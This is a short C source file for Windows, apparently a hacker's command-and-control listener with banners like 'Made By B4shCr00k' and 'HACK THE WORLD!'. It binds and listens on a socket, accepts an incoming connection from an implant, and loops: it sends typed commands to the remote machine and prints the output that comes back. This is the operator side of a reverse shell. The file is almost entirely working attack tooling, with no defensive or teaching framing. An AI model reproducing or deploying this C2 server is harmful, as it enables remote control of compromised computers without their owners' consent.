#include <stdio.h>
#include <stdlib.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment (lib, "Ws2_32.lib")

int main()
{
	SOCKET sock;
	struct sockaddr_in sock_addr;
    	char recvserver[7000];
   	char command[7000];
	WSADATA wsa;
	char ip_addr[] = "0.0.0.0";
	int port = 0000;

	WSAStartup(MAKEWORD(2,2),&wsa);
	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,0,0);

	sock_addr.sin_port = htons(port);
	sock_addr.sin_family = AF_INET;
	sock_addr.sin_addr.s_addr = inet_addr(ip_addr);
    
    int btest = bind(sock,(struct sockaddr*)&sock_addr,sizeof(sock_addr));
    printf("[!] From Dust To DusT !!!\n[!] Made By B4shCr00k\n[!] Type exit To Leave\n");
    printf("[!] Now Binding Socket\n");
    if (btest == 0)
    {
        printf("[+] Socket Bound\n");
    }
    else
    {
        printf("[*] Failed To Bind Socket\n");
    }
    int blis = listen(sock,10);
    printf("[!] Listening ....\n");
    if (blis == 0)
    {
        printf("[+] Listen Succesful\n");
        printf("[!] Waiting For Socket .....\n");
    }
    else
    {
        printf("[*] Failed to Listen\n");
    }
   
    struct sockaddr_in client_addr;
    int clientaddrsize = sizeof(client_addr);

    
    SOCKET baccept = accept(sock,(struct sockaddr*)&client_addr,&clientaddrsize);
    printf("[!] Accepting Socket\n");
    if (baccept < 0)
    {
        printf("[*]Failed to accept\n");
    }
    else
    {
        printf("[+] Socket Accepted\n");
    }
    while (1)
    {
        memset(command,0,sizeof(command));
        memset(recvserver,0,sizeof(recvserver));
        printf("\nC2 > ");
        fgets(command, sizeof(command), stdin);
        command[strcspn(command, "\n")] = 0;
        send(baccept,command,sizeof(command),0);
        if (strcmp(command, "exit") == 0) {
            printf("HACK THE WORLD!");
            break; 
        }

        
        
        Sleep(500);
        recv(baccept,recvserver,sizeof(recvserver),0);
        printf("%s",recvserver);

    }
    
    
    WSACleanup();
    closesocket(sock);
    closesocket(baccept);

}	
